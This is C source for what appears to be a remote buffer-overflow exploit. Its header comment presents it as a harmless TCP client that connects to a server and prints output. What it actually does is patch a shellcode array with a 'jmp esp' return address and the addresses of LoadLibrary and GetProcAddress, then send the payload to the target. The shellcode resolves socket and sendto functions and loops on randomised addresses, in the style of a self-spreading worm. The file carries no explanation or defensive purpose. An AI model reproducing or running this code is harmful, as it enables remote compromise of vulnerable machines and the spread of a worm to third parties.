#ifndef unix
#include <windows.h>
#include <winsock.h>
#else
#define closesocket close
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#endif

#include <stdio.h>
#include <string.h>
#pragma  comment(lib,"ws2_32")

#define PROTOPORT       5193            /* default protocol port number */

extern  int             errno;

unsigned char sc[]="\
\x04\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\
\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\
\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\
\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\
\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\
\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\
\x01\xDC\xC9\xB0\x42\xEB\x0E\x01\x01\x01\x01\x01\x01\x01\x70\xAE\
\x42\x01\x70\xAE\x42\x90\x90\x90\x90\x90\x90\x90\x90\x68\xDC\xC9\
\xB0\x42\xB8\x01\x01\x01\x01\x31\xC9\xB1\x18\x50\xE2\xFD\x35\x01\
\x01\x01\x05\x50\x89\xE5\x51\x68\x2E\x64\x6C\x6C\x68\x65\x6C\x33\
\x32\x68\x6B\x65\x72\x6E\x51\x68\x6F\x75\x6E\x74\x68\x69\x63\x6B\
\x43\x68\x47\x65\x74\x54\x66\xB9\x6C\x6C\x51\x68\x33\x32\x2E\x64\
\x68\x77\x73\x32\x5F\x66\xB9\x65\x74\x51\x68\x73\x6F\x63\x6B\x66\
\xB9\x74\x6F\x51\x68\x73\x65\x6E\x64\xBE\x18\x10\xAE\x42\x8D\x45\
\xD4\x50\xFF\x16\x50\x8D\x45\xE0\x50\x8D\x45\xF0\x50\xFF\x16\x50\
\xBE\x10\x10\xAE\x42\x8B\x1E\x8B\x03\x3D\x55\x8B\xEC\x51\x74\x05\
\xBE\x1C\x10\xAE\x42\xFF\x16\xFF\xD0\x31\xC9\x51\x51\x50\x81\xF1\
\x03\x01\x04\x9b\x81\xf1\x01\x01\x01\x01\x51\x8d\x45\xcc\x50\x8b\
\x45\xc0\x50\xff\x16\x6a\x11\x6a\x02\x6a\x02\xff\xd0\x50\x8d\x45\
\xc4\x50\x8b\x45\xc0\x50\xff\x16\x89\xc6\x09\xdb\x81\xf3\x3c\x61\
\xd9\xff\x8b\x45\xb4\x8d\x0c\x40\x8d\x14\x88\xc1\xe2\x04\x01\xc2\
\xc1\xe2\x08\x29\xc2\x8d\x04\x90\x01\xd8\x89\x45\xb4\x6a\x10\x8d\
\x45\xb0\x50\x31\xc9\x51\x66\x81\xf1\x78\x01\x51\x8d\x45\x03\x50\
\x8b\x45\xac\x50\xff\xd6\xeb\xca";

char    localhost[] =   "localhost";    /* default host name            */
/*------------------------------------------------------------------------
 * Program:   client                                            
 *                                                              
 * Purpose:   allocate a socket, connect to a server, and print all output
 *                                                              
 * Syntax:    client [ host [port] ]
 *
 *               host  - name of a computer on which server is executing
 *               port  - protocol port number server is using
 *
 * Note:      Both arguments are optional.  If no host name is specified,
 *            the client uses "localhost"; if no protocol port is
 *            specified, the client uses the default given by PROTOPORT.
 *
 *------------------------------------------------------------------------
 */
main(argc, argv)
int     argc;
char    *argv[];
{
        struct  hostent  *ptrh;  /* pointer to a host table entry       */
        struct  protoent *ptrp;  /* pointer to a protocol table entry   */
        struct  sockaddr_in sad; /* structure to hold an IP address     */
        int     sd;              /* socket descriptor                   */
        int     port;            /* protocol port number                */
        char    *host;           /* pointer to host name                */
        int     n;               /* number of characters read           */
        char    buf[1000];       /* buffer for data from the server     */
#ifdef WIN32
        WSADATA wsaData;
        WSAStartup(0x0101, &wsaData);
#endif
        memset((char *)&sad,0,sizeof(sad)); /* clear sockaddr structure */
        sad.sin_family = AF_INET;         /* set family to Internet     */

        /* Check command-line argument for protocol port and extract    */
        /* port number if one is specified.  Otherwise, use the default */
        /* port value given by constant PROTOPORT                       */

        if (argc > 2) {                 /* if protocol port specified   */
                port = atoi(argv[2]);   /* convert to binary            */
        } else {
                port = PROTOPORT;       /* use default port number      */
        }
        if (port > 0)                   /* test for legal value         */
                sad.sin_port = htons((u_short)port);
        else {                          /* print error message and exit */
                fprintf(stderr,"bad port number %s\n",argv[2]);
                exit(1);
        }

        /* Check host argument and assign host name. */

        if (argc > 1) {
                host = argv[1];         /* if host argument specified   */
        } else {
                host = localhost;
        }

        /* Convert host name to equivalent IP address and copy to sad. */

        ptrh = gethostbyname(host);
        if ( ((char *)ptrh) == NULL ) {
                fprintf(stderr,"invalid host: %s\n", host);
                exit(1);
        }
        memcpy(&sad.sin_addr, ptrh->h_addr, ptrh->h_length);

        /* Map TCP transport protocol name to protocol number. */

        if ( ((int)(ptrp = getprotobyname("tcp"))) == 0) {
                fprintf(stderr, "cannot map \"tcp\" to protocol number");
                exit(1);
        }

        /* Create a socket. */

        sd = socket(PF_INET, SOCK_STREAM, ptrp->p_proto);
        if (sd < 0) {
                fprintf(stderr, "socket creation failed\n");
                exit(1);
        }

        /* Connect the socket to the specified server. */

        if (connect(sd, (struct sockaddr *)&sad, sizeof(sad)) < 0) {
                fprintf(stderr,"connect failed\n");
                exit(1);
        }

//         n = send(sd, "hello!", 7, 0);

       *(UINT *)(sc+0x61) = 0x00407030;		// "jmp esp"
       *(UINT *)(sc+0x7e) = 0x00407030;		// "jmp esp"
       *(UINT *)(sc+0xda) = 0x00406004;		// LoadLibrary()
       *(UINT *)(sc+0xf1) = 0x00406000;		// GetProcAddress()
       /* *(USHORT *)(sc+0x112) = (USHORT)port ^ 0x0101; */
       /* *(UCHAR *)(sc+0x7c) = 0xcc; */

       n = send(sd, sc+1, sizeof(sc), 0);

        /* Close the socket. */
        closesocket(sd);

        /* Terminate the client program gracefully. */

        exit(0);
}
